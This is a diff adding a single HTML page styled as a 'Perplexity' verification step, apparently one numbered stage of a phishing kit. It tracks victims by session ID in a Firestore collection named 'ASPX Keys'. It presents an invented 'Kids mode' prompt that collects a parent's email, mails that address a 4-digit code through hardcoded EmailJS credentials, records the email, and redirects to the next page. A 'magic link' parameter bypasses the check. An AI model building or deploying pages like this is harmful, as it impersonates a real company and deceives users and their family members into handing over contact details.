@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification - Perplexity</title>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        :root { --primary: #202124; --bg: #ffffff; --text: #000000; --gray: #70757a; --border: #e0e0e0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; height: 100vh; }
+        
+        .container { width: 90%; max-width: 400px; text-align: center; margin-top: 60px; position: relative; }
+        
+        /* Close Button */
+        .close-btn { position: absolute; top: -30px; right: 0; font-size: 24px; color: #555; cursor: pointer; text-decoration: none; padding: 10px; }
+
+        /* Icon Styling */
+        .icon-wrapper { position: relative; width: 110px; height: 110px; margin: 0 auto 40px; border: 1.2px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .icon-wrapper::after { content: ''; position: absolute; width: 85px; height: 85px; border: 1.2px solid var(--border); border-radius: 50%; }
+        .paper-plane { width: 38px; fill: #1a1a1b; transform: rotate(-10deg); }
+
+        h1 { font-family: 'Times New Roman', Times, serif; font-size: 38px; font-weight: 500; margin: 0 0 20px 0; letter-spacing: -0.5px; }
+        .subtext { font-size: 15px; color: var(--gray); line-height: 1.6; margin-bottom: 45px; }
+        .email-highlight { color: #1a1a1b; font-weight: 450; }
+
+        /* Input Boxes */
+        .otp-group { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 35px; }
+        .otp-input { width: 55px; height: 75px; border: 1.5px solid var(--border); border-radius: 12px; font-size: 32px; text-align: center; outline: none; transition: border-color 0.2s; -moz-appearance: textfield; }
+        .otp-input::-webkit-outer-spin-button, .otp-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .otp-input:focus { border-color: #000; }
+        
+        .email-input { width: 100%; padding: 18px; border: 1.5px solid var(--border); border-radius: 12px; font-size: 16px; margin-bottom: 25px; box-sizing: border-box; outline: none; }
+
+        button { width: 100%; padding: 18px; background: #b5b5b5; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: not-allowed; }
+        button.active { background: #202124; cursor: pointer; }
+        
+        .hidden { display: none; }
+        #status-msg { margin-top: 40px; font-size: 14px; color: var(--gray); }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <a href="#" class="close-btn">✕</a>
+    <div id="status-msg">Loading...</div>
+
+    <!-- UI STEP: PARENT EMAIL (Required for Kids) -->
+    <div id="email-ui" class="hidden">
+        <div class="icon-wrapper">
+            <svg class="paper-plane" viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+        </div>
+        <h1>Parental Access</h1>
+        <p class="subtext">This account is set to Kids mode. Please enter a parent's email to authorize this sign-in.</p>
+        <input type="email" id="pEmail" class="email-input" placeholder="parent@example.com">
+        <button id="sendEmailBtn" class="active">Send Access Link</button>
+    </div>
+
+    <!-- UI STEP: OTP INPUT (Matches Image) -->
+    <div id="otp-ui" class="hidden">
+        <div class="icon-wrapper">
+            <svg class="paper-plane" viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+        </div>
+        <h1>Check your email</h1>
+        <p class="subtext">A temporary sign-in link has been sent to <br><span class="email-highlight" id="targetEmail"></span></p>
+        
+        <div class="otp-group">
+            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 0)">
+            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 1)">
+            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 2)">
+            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 3)">
+        </div>
+        <button id="confirmBtn">Confirm</button>
+    </div>
+</div>
+
+<script type="module">
+    // --- 1. FIREBASE INITIALIZATION ---
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+        // !! Replace with your real Firebase config !!
+        projectId: "question-metabase",
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // --- 2. EMAILJS INITIALIZATION ---
+    emailjs.init("Yr9MutUoHOEONnFgn");
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('session');
+    const magicCode = urlParams.get('code'); // MAGIC LINK PARAMETER
+
+    let generatedOtp = "";
+    let parentEmail = "";
+
+    async function init() {
+        if (!sessionId) {
+            document.getElementById('status-msg').innerText = "Session Missing.";
+            return;
+        }
+
+        try {
+            const docRef = doc(db, "ASPX Keys", sessionId);
+            const snap = await getDoc(docRef);
+
+            if (snap.exists()) {
+                const data = snap.data();
+
+                // 1. Direct Redirect Conditions
+                if (data.family === "no" || data.family === "busniess") {
+                    window.location.href = "6.html";
+                    return;
+                }
+
+                // 2. MAGIC LINK LOGIC: If &code= is present in URL
+                if (magicCode) {
+                    await finalizeAccount("Magic Link User"); // Use placeholder if email not in URL
+                    return;
+                }
+
+                // 3. KIDS ACCOUNT FLOW
+                if (data.family === "commit") {
+                    document.getElementById('status-msg').classList.add('hidden');
+                    document.getElementById('email-ui').classList.remove('hidden');
+                } else if (data.family === "commited") {
+                    window.location.href = "6.html";
+                }
+            }
+        } catch (e) {
+            console.error(e);
+            document.getElementById('status-msg').innerText = "Database Error.";
+        }
+    }
+
+    // Handle Sending Email
+    document.getElementById('sendEmailBtn').onclick = async () => {
+        parentEmail = document.getElementById('pEmail').value;
+        if (!parentEmail.includes('@')) return alert("Enter valid email");
+
+        // 4-digit code
+        generatedOtp = Math.floor(1000 + Math.random() * 9000).toString();
+        
+        const templateParams = {
+            email: parentEmail,
+            otp: generatedOtp,
+            session: sessionId
+        };
+
+        try {
+            document.getElementById('sendEmailBtn').innerText = "Sending...";
+            await emailjs.send('service_1ij08zn', 'template_qxz1wka', templateParams);
+            
+            document.getElementById('targetEmail').innerText = parentEmail;
+            document.getElementById('email-ui').classList.add('hidden');
+            document.getElementById('otp-ui').classList.remove('hidden');
+        } catch (err) {
+            alert("Email failed to send. Try again.");
+            document.getElementById('sendEmailBtn').innerText = "Send Access Link";
+        }
+    };
+
+    // Handle OTP Manual Confirmation
+    document.getElementById('confirmBtn').onclick = async () => {
+        const inputs = document.querySelectorAll('.otp-input');
+        let enteredCode = "";
+        inputs.forEach(i => enteredCode += i.value);
+
+        if (enteredCode === generatedOtp) {
+            await finalizeAccount(parentEmail);
+        } else {
+            alert("Invalid code. Please check your email.");
+        }
+    };
+
+    // SHARED FUNCTION: Update Firebase and Redirect
+    async function finalizeAccount(guardianEmail) {
+        try {
+            const docRef = doc(db, "ASPX Keys", sessionId);
+            await updateDoc(docRef, {
+                family: "commited", // Changed from commit
+                guardians: guardianEmail,
+                updatedAt: new Date().toLocaleString()
+            });
+            window.location.href = "6.html";
+        } catch (e) {
+            alert("Update failed: " + e.message);
+        }
+    }
+
+    // UI Helper: Auto-focus next input
+    window.stepNext = (el, idx) => {
+        const inputs = document.querySelectorAll('.otp-input');
+        if (el.value.length === 1 && idx < 3) inputs[idx + 1].focus();
+        
+        let isDone = true;
+        inputs.forEach(i => { if(!i.value) isDone = false; });
+        if(isDone) document.getElementById('confirmBtn').classList.add('active');
+    };
+
+    init();
+</script>
+</body>
+</html>
